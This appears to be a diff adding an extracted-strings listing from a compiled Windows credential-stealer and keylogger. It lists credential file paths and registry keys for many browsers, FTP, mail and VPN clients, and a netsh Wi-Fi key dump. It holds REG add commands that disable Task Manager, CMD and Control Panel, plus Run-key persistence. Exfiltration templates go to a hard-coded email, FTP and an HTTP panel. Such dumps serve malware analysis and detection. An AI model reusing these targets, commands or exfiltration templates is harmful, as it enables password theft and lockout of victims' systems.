@@ -1,0 +1,975 @@
+115228: PortNumber
+115268: [PRIVATE KEY LOCATION: "{0}"]
+115284: APPDATA
+115308: WinSCP
+115324: Username
+115364: All Users
+115380: port=
+115404: \FlashFXP\3quick.dat
+115420: user=
+115460: pass=
+115476: FlashFXP
+115500: created=
+115516: SystemDrive
+115556: \FTP Navigator\Ftplist.txt
+115572: Password
+115596: Server
+115612: No Password
+115652: User
+115668: Programfiles(x86)
+115692: FTP Navigator
+115708: programfiles
+115748: \jDownloader\config\database.script
+115764: \jDownloader\config\database.script
+115788: programfiles(x86)
+115804: INSERT INTO CONFIG VALUES('AccountController','
+115844: JDownloader
+115860: HKEY_CURRENT_USER\Software\Paltalk\
+115884: Software\Paltalk
+115900: http://Paltalk.com
+115940: Paltalk
+115956: \.purple\accounts.xml
+115980: APPDATA
+115996: APPDATA
+116036: \.purple\accounts.xml
+116052: <protocol>
+116076: <account>
+116092: </protocol>
+116132: <name>
+116148: <password>
+116172: </name>
+116188: </password>
+116228: Pidgin
+116260: \Psi\profiles
+116276: \Psi+\profiles
+116300: APPDATA
+116316: \accounts.xml
+116356: \accounts.xml
+116372: password
+116396: name
+116412: Psi/Psi+
+116452: Software\OpenVPN-GUI\configs
+116468: Software\OpenVPN-GUI\configs\
+116492: Software\OpenVPN-GUI\configs
+116508: username
+116548: auth-data
+116564: Open VPN
+116588: entropy
+116604: USERPROFILE
+116644: \OpenVPN\config\
+116660: remote 
+116684: remote 
+116700: ovpn file not found
+116740: APPDATA
+116756: <Server>
+116780: \FileZilla\recentservers.xml
+116796: <Host>
+116836: <Host>
+116852: <Port>
+116876: </Host>
+116892: </Port>
+116932: <User>
+116948: </User>
+116972: <User>
+116988: <Pass encoding="base64">
+117028: <Pass encoding="base64">
+117044: <Pass>
+117068: </Pass>
+117084: <Pass>
+117124: </Pass>
+117140: SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions
+117164: FileZilla
+117180: HostName
+117220: UserName
+117236: PublicKeyFile
+117260: Password
+117268: \accountrc
+117292: use_master_passphrase=(.+)
+117308: smtp_server
+117348: address
+117364: \passwordstorerc
+117388: account
+117404: {(.*),(.*)}(.*)
+117444: ClawsMail
+117460: Substring
+117484: TransformFinalBlock
+117500: IterationCount
+117540: GetBytes
+117556: Postbox
+117580: Postbox
+117596: signons3.txt
+117636: objects
+117652: objects
+117676: objects
+117692: Data
+117732: objects
+117748: Data
+117772: objects
+117788: DecryptTripleDes
+117828: Flock Browser
+117844: wlan show profile
+117868: netsh
+117884: All User Profile
+117924: All User Profile * : (?<profile>.*)
+117940: Wi-Fi
+117964: profile
+117980: wlan show profile name="
+118020: " key=clear
+118036: password
+118060: Key Content * : (?<password>.*)
+118076: No Password!
+118116: ALLUSERSPROFILE
+118132: username=
+118156: DynDNS\Updater\config.dyndns
+118172: password=
+118212: t6KzXhCh
+118228: DynDNS
+118252: http://DynDns.com
+118268: APPDATA
+118300: HKEY_CURRENT_USER\Software\Qualcomm\Eudora\CommandLine
+118340: current
+118356: SavePasswordText
+118380: Settings
+118396: Settings
+118436: ReturnAddress
+118452: Thunderbird
+118476: Eudora
+118492: Thunderbird
+118532: BlackHawk
+118548: CyberFox
+118572: BlackHawk
+118588: CyberFox
+118628: K-Meleon
+118644: IceCat
+118668: K-Meleon
+118684: IceCat
+118724: PaleMoon
+118740: IceDragon
+118764: PaleMoon
+118780: IceDragon
+118820: WaterFox
+118836: \falkon\profiles\
+118860: WaterFox
+118876: startProfile="([A-z0-9\/\.]+)"
+118916: profiles.ini
+118932: autofill
+118956: \browsedata.db
+118972: Falkon Browser
+119012: startProfile=([A-z0-9\/\.]+)
+119028: Backend=([A-z0-9\/\.-]+)
+119052: profiles.ini
+119068: \settings.ini
+119108: \browsedata.db
+119124: Falkon Browser
+119148: autofill
+119164: \Claws-mail
+119204: \clawsrc
+119220: passkey0
+119244: \clawsrc
+119260: master_passphrase_salt=(.+)
+119300: master_passphrase_pbkdf2_rounds=(.+)
+119332: 82BD0E67-9FEA-4748-8672-D5EFE5B779B0
+119348: PtrToStructure
+119372: Windows Generic Credential
+119388: ToInt64
+119428: SchemaId
+119444: pIdentityElement
+119468: pResourceElement
+119484: LastModified
+119524: pPackageSid
+119540: IE/Edge
+119564: pAuthenticatorElement
+119580: Type
+119620: Value
+119636: \Apple Computer\Preferences\keychain.plist
+119660: \Common Files\Apple\Apple Application Support\plutil.exe
+119676: SeaMonkey
+119716: SeaMonkey
+119732: UCBrowser\
+119756: logins
+119772: Login Data
+119812: journal
+119828: wow_logins
+119852: UC Browser
+119868: Tencent\QQBrowser\User Data
+119908: \Default\EncryptedStorage
+119924: \EncryptedStorage
+119948: Profile
+119964: entries
+120004: category
+120020: str3
+120044: Password
+120060: str2
+120100: blob0
+120116: PopPassword
+120140: QQ Browser
+120156: SmtpPassword
+120196: Software\IncrediMail\Identities\
+120212: PopPassword
+120236: \Accounts_New
+120252: SmtpPassword
+120292: EmailAddress
+120308: incredimail
+120332: SmtpServer
+120340: Path=([A-z0-9\/\.\-]+)
+120364: \Waterfox\
+120380: profiles.ini
+120420: \Default\
+120436: None
+120460: Profile
+120476: win32_processor
+120516: processorID
+120532: InstancesOf
+120556: WinMgmts:
+120572: Win32_BaseBoard
+120612: SerialNumber
+120628: username_value
+120652: origin_url
+120668: password_value
+120708: \Default\Login Data
+120724: Profile
+120748: \Login Data
+120764: \Login Data
+120804: \Google\Chrome\User Data\
+120820: logins
+120844: Chrome
+120860: Firefox
+120900: Firefox
+120916: Minor
+120940: Major
+120956: 2F1A6504-0641-44CF-8BB5-3612D865F2E5
+120996: Windows Secure Note
+121012: Windows Web Password Credential
+121036: 3CCD5499-87A8-4B10-A215-608888DD3B55
+121052: 154E23D0-C644-4E6F-8CE6-5069272F999F
+121092: Windows Credential Picker Protector
+121108: Web Credentials
+121132: 4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+121148: 77BC582B-F0A6-4E15-4E80-61736B6F3B29
+121188: Windows Credentials
+121204: Windows Domain Certificate Credential
+121228: E69D7838-91B5-4FC9-89D5-230D4D4CC2BC
+121244: 3E0E35BE-1B77-43E7-B873-AED901B6275B
+121284: Windows Domain Password Credential
+121300: Windows Extended Credential
+121324: 3C886FF3-2669-4AA2-A8FB-3F6759A77548
+121340: 00000000-0000-0000-0000-000000000000
+121372: QIP Surf\User Data
+121412: QQ Browser
+121428: UC Browser
+121452: Tencent\QQBrowser\User Data
+121468: UCBrowser\
+121508: .zip
+121524: Firefox
+121548: cookies.sqlite
+121564: APPDATA
+121604: \Mozilla\Firefox\
+121620: APPDATA
+121644: Postbox
+121660: \Postbox\
+121700: Thunderbird
+121716: \Thunderbird\
+121740: APPDATA
+121756: SeaMonkey
+121796: APPDATA
+121812: Flock
+121836: \Mozilla\SeaMonkey\
+121852: APPDATA
+121892: \Flock\Browser\
+121908: APPDATA
+121932: BlackHawk
+121948: \NETGATE Technologies\BlackHawk\
+121988: CyberFox
+122004: \8pecxstudios\Cyberfox\
+122028: APPDATA
+122044: K-Meleon
+122084: APPDATA
+122100: IceCat
+122124: \K-Meleon\
+122140: APPDATA
+122180: \Mozilla\icecat\
+122196: APPDATA
+122220: PaleMoon
+122236: \Moonchild Productions\Pale Moon\
+122276: IceDragon
+122292: \Comodo\IceDragon\
+122316: APPDATA
+122332: WaterFox
+122372: APPDATA
+122404: CoolNovo
+122420: SRWare Iron
+122444: MapleStudio\ChromePlus\User Data
+122460: Chromium\User Data
+122500: Torch Browser
+122516: Brave Browser
+122540: Torch\User Data
+122556: BraveSoftware\Brave-Browser\User Data
+122596: Iridium Browser
+122612: 7Star
+122636: \Iridium\User Data
+122652: 7Star\7Star\User Data
+122692: Amigo
+122708: CentBrowser
+122732: Amigo\User Data
+122748: CentBrowser\User Data
+122788: Chedot
+122804: CocCoc
+122828: Chedot\User Data
+122844: CocCoc\Browser\User Data
+122884: Elements Browser
+122900: Epic Privacy Browser
+122924: Elements Browser\User Data
+122940: Epic Privacy Browser\User Data
+122980: Kometa
+122996: Orbitum
+123020: Kometa\User Data
+123036: Orbitum\User Data
+123076: Sputnik
+123092: uCozMedia
+123116: Sputnik\Sputnik\User Data
+123132: uCozMedia\Uran\User Data
+123172: Vivaldi
+123188: Sleipnir 6
+123212: Vivaldi\User Data
+123228: Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer
+123268: Citrio
+123284: Coowon
+123308: CatalinaGroup\Citrio\User Data
+123324: Coowon\Coowon\User Data
+123364: Liebao Browser
+123380: QIP Surf
+123404: liebao\User Data
+125468: [^\u0020-\u007F]
+125508: [^\u0020-\u007F]
+125524: Padding
+125548: Mode
+125564: CreateDecryptor
+125604: TransformFinalBlock
+125620: Padding
+125644: Mode
+125660: CreateDecryptor
+125700: TransformFinalBlock
+125716: Padding
+125740: Mode
+125756: CreateDecryptor
+125796: TransformFinalBlock
+125812: Substring
+125836: EndsWith
+125852: Length
+125892: IndexOf
+125908: IndexOf
+125932: Substring
+125948: UNIQUE
+125988: table
+126004: User
+126028: Software\DownloadManager\Passwords\
+126044: EncPassword
+126084: Internet Download Manager
+126100: No Data
+126124: SystemDrive
+126140: WScript.Shell
+126180: RegRead
+126196: Writing is not alowed
+126220: Stream cannot seek
+126236: Writing is not allowed
+126276: Writing is not alowed
+126292: Stream cannot be written
+126316: Central directory currently does not exist
+126332: RemoveEntries is allowed just over streams of type FileStream
+126500: ABCDEF
+126516: \Mozilla\Firefox\
+126540: APPDATA
+126556: \Postbox\
+126596: \Thunderbird\
+126612: \Flock\Browser\
+126636: \Mozilla\SeaMonkey\
+126652: \NETGATE Technologies\BlackHawk\
+126692: \8pecxstudios\Cyberfox\
+126708: \Mozilla\icecat\
+126732: \K-Meleon\
+126748: \Moonchild Productions\Pale Moon\
+126788: \Comodo\IceDragon\
+126804: key4.db
+126828: \Waterfox\
+126844: key4.db
+126884: metaData
+126900: item1
+126924: password
+126940: item2
+126980: nssPrivate
+126996: key3.db
+127020: a102
+127036: key3.db
+127076: global-salt
+127092: password-check
+127116: Version
+127132: Value
+127172: global-salt
+127188: Replace
+127212: Value
+127228: Path=([A-z0-9\/\.\-]+)
+127268: profiles.ini
+127284: logins.json
+127308: logins.json
+127324: \"(hostname|encryptedPassword|encryptedUsername)":"(.*?)"
+127364: [^\u0020-\u007F]
+127380: signons.sqlite
+127404: [^\u0020-\u007F]
+127420: moz_logins
+127460: hostname
+127476: encryptedPassword
+127500: encryptedUsername
+127508: \Account.stg
+127532: \Accounts\Account.rec0
+127548: Length
+127588: Read
+127604: Dispose
+127628: Close
+127644: POP3Host
+127684: SMTPHost
+127700: Account
+127724: IncomingServer
+127740: MailAddress
+127780: Password
+127796: !empty!
+127820: POP3Password
+127836: Foxmail
+127876: No Data!
+127892: \Opera Mail\Opera Mail\wand.dat
+127916: \Opera Mail\Opera Mail\wand.dat
+127932: opera:
+127972: Opera Mail
+127988: appdata
+128012: abcádefgghiijklmnoîpqrsstuÅvwxyz1234567890_-.~!@#$%^&*()[{]}\|';:,<>/?+=\n 
+128028: \Pocomail\accounts.ini
+128068: appdata
+128084: Email
+128108: \Pocomail\accounts.ini
+128124: POPPass
+128164: SMTPPass
+128180: PocoMail
+128204: SMTP
+128220: No data!
+128260: <array>
+128276: Length
+128300: <dict>
+128316: <string>
+128356: </string>
+128372: </string>
+128396: <string>
+128412: <data>
+128452: </data>
+128468:  -convert xml1 -s -o "
+128492: Safari Browser
+128508: \fixed_keychain.xml" 
+128540: PassWd
+128580: Becky!
+128596: Account
+128620: \Trillian\users\global\accounts.dat
+128636: Accounts
+128676: www.trillian.im
+128692: Password
+128716: Account
+128732: Trillian
+128772: Length
+128788: Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676
+128812: Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676
+128828: Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676
+128868: Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676
+128884: IMAP Password
+128908: Email
+128924: POP3 Password
+128964: HTTP Password
+128980: IMAP Password
+129004: SMTP Password
+129020: POP3 Password
+129060: HTTP Password
+129076: Email
+129100: SMTP Password
+129116: GetBytes
+129156: SMTP Server
+129172: SMTP Server
+129196: SMTP Server
+129212: Not found!
+129252: Outlook
+129268: Executable
+129292: HKEY_CURRENT_USER\Software\Aerofox\FoxmailPreview
+129308: HKEY_CURRENT_USER\Software\Aerofox\Foxmail\V3.1
+129348: FoxmailPath
+129364: \Storage\
+129388: \Storage\
+129404: \mail\
+129444: \mail\
+129460: \VirtualStore\Program Files\Foxmail\mail\
+129484: \VirtualStore\Program Files\Foxmail\mail\
+129500: \VirtualStore\Program Files (x86)\Foxmail\mail\
+129540: \VirtualStore\Program Files (x86)\Foxmail\mail\
+129572: ;Server=
+129588: \FTPGetter\servers.xml
+129612: FTPCommander
+129628: <server>
+129668: <server_ip>
+129684: </server_ip>
+129708: <server_ip>
+129724: <server_port>
+129764: </server_port>
+129780: <server_user_name>
+129804: <server_user_name>
+129820: </server_user_name>
+129860: <server_user_password>
+129876: </server_user_password>
+129900: <server_user_password>
+129916: FTPGetter
+129956: HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC
+129972: USERname
+129996: HKEY_CURRENT_USER\SOFTWARE\Vitalwerks\DUC
+130012: Password
+130052: UserName
+130068: http://no-ip.com
+130092: Password
+130108: NO-IP
+130148: http://no-ip.com
+130164: +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
+130188: NO-IP
+130204: appdata
+130244: \The Bat!
+130260: \The Bat!
+130284: appdata
+130300: \Account.CFN
+130340: \Account.CFN
+130356: HKEY_CURRENT_USER\Software\RimArts\B2\Settings
+130380: TheBat
+130396: DataDir
+130436: Folder.lst
+130452: Account
+130476: \Mailbox.ini
+130492: SMTPServer
+130532: Account
+130548: Account
+130572: MailAddress
+130580: \SmartFTP\Client 2.0\Favorites\Quick Connect\
+130604: APPDATA
+130620: APPDATA
+130660: \SmartFTP\Client 2.0\Favorites\Quick Connect\*.xml
+130676: </Host>
+130700: <Host>
+130716: <Port>
+130756: </Port>
+130772: </User>
+130796: <User>
+130812: <Password>
+130852: </Password>
+130868: </Name>
+130892: <Name>
+130908: SmartFTP
+130948: appdata
+130964: appdata
+130988: \Ipswitch\WS_FTP\Sites\ws_ftp.ini
+131004: \Ipswitch\WS_FTP\Sites\ws_ftp.ini
+131044: HOST
+131060: PWD=
+131084: WS_FTP
+131100: PWD=
+131140: Substring
+131156: Length
+131180: Length
+131196: Substring
+131236: Substring
+131252: Mode
+131276: Password decryption failed!
+131292: Padding
+131332: CreateDecryptor
+131348: \cftp\Ftplist.txt
+131372: SystemDrive
+131388: ;Server=
+131428: ;Port=
+131444: ;Password=
+131468: ;Port=
+131484: ;User=
+131524: ;Anonymous=
+131540: ;User=
+131564: ;Password=
+131580: Name=
+131636: .lnk
+131660: .lnk
+131676: .lnk
+131716: WScript.Shell
+131732: .lnk
+131756: CreateShortcut
+131772: TargetPath
+131812: cmd.exe
+131828: Arguments
+131852: WorkingDirectory
+131868: /c start 
+131908: &start 
+131924: IconLocation
+131948:  & exit
+131964: Save
+132004:  .lnk
+132020: CreateShortcut
+132044: WScript.Shell
+132060:  .lnk
+132100: TargetPath
+132116: WorkingDirectory
+132140: cmd.exe
+132156: Arguments
+132196: /c start 
+132212: " & exit
+132236: &explorer /root,"%CD%
+132252: IconLocation
+132292: %SystemRoot%\system32\SHELL32.dll,3
+132308: Software\Classes\
+132332: Save
+132348: OpenSubKey
+132388: OpenSubKey
+132404: \DefaultIcon\
+132428: GetValue
+132444: GetValue
+132484: yyyy-MM-dd HH:mm:ss
+132500: ProductId
+132524: SOFTWARE\Microsoft\Windows NT\CurrentVersion
+132540: 76487-337-8429955-22614
+132580: %startupfolder%
+132596: %startupfolder%
+132620: \%insfolder%\%insname%
+139796: <font color=#008000>&darr;</font>
+139820: <font color=#008000>&uarr;</font>
+139836: <font color=#008000>&larr;</font>
+139876: <font color=#008000>&rarr;</font>
+139892: <font color=#008000>{END}</font>
+139916: <font color=#008000>{DEL}</font>
+139932: <font color=#008000>{HOME}</font>
+139972: <font color=#008000>{Insert}</font>
+139988: <font color=#008000>{PageDown}</font>
+140012: <font color=#008000>{NumLock}</font>
+140028: <font color=#008000>{PageUp}</font>
+140068: <font color=#008000>{ENTER}</font>
+140084: <font color=#008000>{F1}</font>
+140108: <br>
+140124: <font color=#008000>{F2}</font>
+140164: <font color=#008000>{F3}</font>
+140180: <font color=#008000>{F5}</font>
+140204: <font color=#008000>{F4}</font>
+140220: <font color=#008000>{F6}</font>
+140260: <font color=#008000>{F7}</font>
+140276: <font color=#008000>{F9}</font>
+140300: <font color=#008000>{F8}</font>
+140316: <font color=#008000>{F10}</font>
+140356: <font color=#008000>{F11}</font>
+140372: control
+140396: <font color=#008000>{F12}</font>
+140412: <font color=#008000>{CTRL}</font>
+140452: &amp;
+140468: &gt;
+140492: &lt;
+140508: &quot;
+140548: .zip
+140564: Chrome
+140588: Cookies
+140604: \Google\Chrome\User Data
+140644: Opera
+140660: Yandex
+140684: Opera Software\Opera Stable
+140700: Yandex\YandexBrowser\User Data
+140740: 360 Browser
+140756: Comodo Dragon
+140780: \360Chrome\Chrome\User Data
+140796: Comodo\Dragon\User Data
+140828: REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+140868: REG add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f
+140884: DisableCMD
+140908: HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System
+140924: REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
+140964: REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
+140980: DisableRegistryTools
+141004: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System
+141020: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore
+141060: DisableSR
+141076: REG add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
+141100: REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
+141116: SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths
+141156: MSCONFIG.EXE
+141172: .tmp
+141196: \tmpG
+141212: %urlkey%
+141252: %PostURL%
+141268: POST
+141292: Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
+141308: application/x-www-form-urlencoded
+141348: &amp;
+141364: &gt;
+141388: &lt;
+141404: &quot;
+141444: <br><b>[clipboard]</b>
+141460: <br><span style=color:#0099cc;><b>[ 
+141484: <b>[clipboard]</b><br>
+141500: </b>
+141540:  <b>]</b> <span style=color:#000000;>(
+141556: )</span></span><br>
+141580: MM/dd/yyyy HH:mm:ss
+141596: False
+141636: <font color=#008000>{BACK}</font>
+141652: <br>
+141676: </font>
+141692: <font color=#008000>{ALT+TAB}</font>
+141732: <font color=#008000>{ALT+F4}</font>
+141748: <font color=#008000>{ESC}</font>
+141772: <font color=#008000>{TAB}</font>
+141788: <font color=#008000>{Win}</font>
+141828: <font color=#008000>{CAPSLOCK}</font>
+141860: <br>
+141876:  Recovered Accounts
+141900: <hr>
+141916: Time: 
+141956: <br>UserName: 
+141972: <br>OSFullName: 
+141996: <br>ComputerName: 
+142012: <br>CPU: 
+142052: <br>RAM: 
+142068: fran.cess@yandex.com
+142092: <br><hr>
+142108: keylog
+142148: yyyy_MM_dd_HH_mm_ss
+142164: .html
+142188: Recovery_
+142204: <html>Time: 
+142244: <br>UserName: 
+142260: <br>OSFullName: 
+142284: <br>ComputerName: 
+142300: <br>CPU: 
+142340: <br>RAM: 
+142356: </html>
+142380: <br><hr>
+142396: fran.cess@yandex.com
+142436: keylog
+142452: yyyy_MM_dd_HH_mm_ss
+142476: text/html
+142492: .html
+142532: yyyy_MM_dd_HH_mm_ss
+142548: screenshot
+142572: .html
+142588: yyyy_MM_dd_HH_mm_ss
+142628: .jpeg
+142644: cookie
+142668: image/jpg
+142684: Cookies.zip
+142724: application/zip
+142740: olaoluwa
+142764: fran.cess@yandex.com
+142780: smtp.yandex.com
+142820: :Zone.Identifier
+142836: EnableLUA
+142860: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+142868: Citrio
+142892: Vivaldi\User Data
+142908: CatalinaGroup\Citrio\User Data
+142948: Liebao Browser
+142964: Sleipnir 6
+142988: liebao\User Data
+143004: Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer
+143044: QIP Surf
+143060: Coowon
+143084: QIP Surf\User Data
+143100: Coowon\Coowon\User Data
+143140: APPDATA
+143156: HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\
+143180: \CoreFTP\sites.idx
+143196: Host
+143236: HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites
+143252: HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites
+143276: Port
+143292: User
+143332: HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites
+143348: Name
+143372: HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites
+143388: CoreFTP
+143428: webpanel
+143444: smtp
+143468: \nclient[]={0}\nlink[]={1}\nusername[]={2}\npassword[]={3}
+143484: URL:      
+143524: <br>
+143540: <br>
+143564: Username: 
+143580: Password: 
+143620: <br>
+143636: <br>
+143660: Application: 
+143676: <hr>
+143716: \nclient[]={0}\nlink[]={1}\nusername[]={2}\npassword[]={3}
+143732: <br>
+143756: URL:      
+143772: Username: 
+143812: <br>
+143828: <br>
+143852: Password: 
+143868: Application: 
+143900: passwords
+143940: Opera Browser
+143956: Yandex Browser
+143980: Opera Software\Opera Stable\Login Data
+143996: Yandex\YandexBrowser\User Data
+144036: 360 Browser
+144052: Iridium Browser
+144076: 360Chrome\Chrome\User Data
+144092: Iridium\User Data
+144132: Comodo Dragon
+144148: Cool Novo
+144172: Comodo\Dragon\User Data
+144188: MapleStudio\ChromePlus\User Data
+144228: Chromium
+144244: Torch Browser
+144268: Chromium\User Data
+144284: Torch\User Data
+144324: 7Star
+144340: Amigo
+144364: 7Star\7Star\User Data
+144380: Amigo\User Data
+144420: Brave
+144436: CentBrowser
+144460: BraveSoftware\Brave-Browser\User Data
+144476: CentBrowser\User Data
+144516: Chedot
+144532: Coccoc
+144556: Chedot\User Data
+144572: CocCoc\Browser\User Data
+144612: Elements Browser
+144628: Epic Privacy
+144652: Elements Browser\User Data
+144668: Epic Privacy Browser\User Data
+144708: Kometa
+144724: Orbitum
+144748: Kometa\User Data
+144764: Orbitum\User Data
+144804: Sputnik
+144820: Uran
+144844: Sputnik\Sputnik\User Data
+144860: uCozMedia\Uran\User Data
+144900: Vivaldi
+144932: <br>CPU: 
+144948: <br><hr>
+144972: <br>RAM: 
+144988: </html>
+145028: Keystrokes_
+145044: <html>Time: 
+145068: .html
+145084: <br>User Name: 
+145124: <br>Computer Name: 
+145140: <br>CPU: 
+145164: <br>OSFullName: 
+145180: <br>RAM: 
+145220: <br><hr>
+145236: <br>[(
+145260: </html>
+145276: )]<br>
+145316: <br>
+145332: update
+145356: type={0}\nhwid={1}\ntime={2}\npcname={3}\nlogdata={4}\nscreen={5}\nipadd={6}\nwebcam_link={7}\nclient={8}\nlink={9}\nusername={10}\npassword={11}\nscreen_link={12}
+145372: type={0}\nhwid={1}\ntime={2}\npcname={3}\nlogdata={4}\nscreen={5}\nipadd={6}\nwebcam_link={7}\nclient={8}\nlink={9}\nusername={10}\npassword={11}\nscreen_link={12}
+145412: info
+145428: uninstall
+145452: type={0}\nhwid={1}\ntime={2}\npcname={3}\nlogdata={4}\nscreen={5}\nipadd={6}\nwebcam_link={7}\nclient={8}\nlink={9}\nusername={10}\npassword={11}\nscreen_link={12}
+145468: uninstall
+145508: Software\Microsoft\Windows NT\CurrentVersion\Windows
+145524: Software\Microsoft\Windows\CurrentVersion\Run
+145548: Load
+145564: %insregname%
+145604: %ftphost%/
+145620: %ftppassword%
+145644: %ftpuser%
+145660: STOR
+145700: Length
+145716: Length
+145740: Write
+145756: Length
+145796: Close
+145812: %ftpuser%
+145836: %ftphost%/
+145852: %ftppassword%
+145892: STOR
+145908: type={0}\nhwid={1}\ntime={2}\npcname={3}\nlogdata={4}\nscreen={5}\nipadd={6}\nwebcam_link={7}\nscreen_link={8}\n[passwords]
+145932: MM/dd/yyyy HH:mm:ss
+145940: <br>CPU: 
+145964: <br>OSFullName: 
+145980: <br>RAM: 
+146020: <br><hr>
+146036: screenshot
+146060: fran.cess@yandex.com
+146076: yyyy_MM_dd_HH_mm_ss
+146116: Screen_
+146132: /log.tmp
+146156: .jpeg
+146172: MM/dd/yyyy HH:mm:ss
+146212: type={0}\nhwid={1}\ntime={2}\npcname={3}\nlogdata={4}\nscreen={5}\nipadd={6}\nwebcam_link={7}\nclient={8}\nlink={9}\nusername={10}\npassword={11}\nscreen_link={12}
+146228: type={0}\nhwid={1}\ntime={2}\npcname={3}\nlogdata={4}\nscreen={5}\nipadd={6}\nwebcam_link={7}\nclient={8}\nlink={9}\nusername={10}\npassword={11}\nscreen_link={12}
+146252: keylog
+146268: keylog
+146308: <br>[(
+146324: <br>
+146348: )]<br>
+146364:  Keystrokes 
+146404: Time: 
+146420: fran.cess@yandex.com
+146444: <br><hr>
+146460: keylog
+146500:  Keystrokes
+146516: <br>UserName: 
+146540: Time: 
+146556: <br>ComputerName: 
+146596: <br>OSFullName: 
+146612: <br>RAM: 
+146636: <br>CPU: 
+146652: <br><hr>
+146692: fran.cess@yandex.com
+146708: <br>[(
+146732: keylog
+146748: )]<br>
+146788: <br>
+146804: Keystrokes_
+146828: yyyy_MM_dd_HH_mm_ss
+146844: .html
+146884: <html>Time: 
+146900: <br>Computer Name: 
+146924: <br>User Name: 
+146940: <br>OSFullName: 
+146972: \%insfolder%\
+147012: %startupfolder%
+147028: Software\Microsoft\Windows\CurrentVersion\Run
+147052: \%insfolder%\
+147068: %insregname%
+147108: SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run
+147124: Shutdown -r -t 5
+147148: %insregname%
+147164: True
+147204: %DownLink%
+147220: \%filename%
+147244: \%filename%
+147260: root\CIMV2
+147300: SELECT * FROM Win32_VideoController
+147316: Name
+147340: SELECT * FROM Win32_Processor
+147356: Name
+147396: AdapterRAM
+147412: type={0}\nhwid={1}\ntime={2}\npcname={3}\nlogdata={4}\nscreen={5}\nipadd={6}\nwebcam_link={7}\nclient={8}\nlink={9}\nusername={10}\npassword={11}\nscreen_link={12}
+147436: Unknown
+147452: cookies
+147492: MM/dd/yyyy HH:mm:ss
+147508: Time: 
+147532:  Recovered Cookies
+147548: <br>UserName: 
+147588: <br>ComputerName: 
+147604: <br>CPU: 
+147628: <br>OSFullName: 
+147644: <br>RAM: 
+147684: <br><hr>
+147700: cookie
+147724: fran.cess@yandex.com
+147740: yyyy_MM_dd_HH_mm_ss
+147780: Cookie_
+147796: type={0}\nhwid={1}\ntime={2}\npcname={3}\nlogdata={4}\nscreen={5}\nipadd={6}\nwebcam_link={7}\nclient={8}\nlink={9}\nusername={10}\npassword={11}\nscreen_link={12}
+147820: .zip
+147836: screenshots
+147876: MM/dd/yyyy HH:mm:ss
+147892: Time: 
+147916:  Screen Capture
+147932: <br>UserName: 
+147972: <br>ComputerName: 
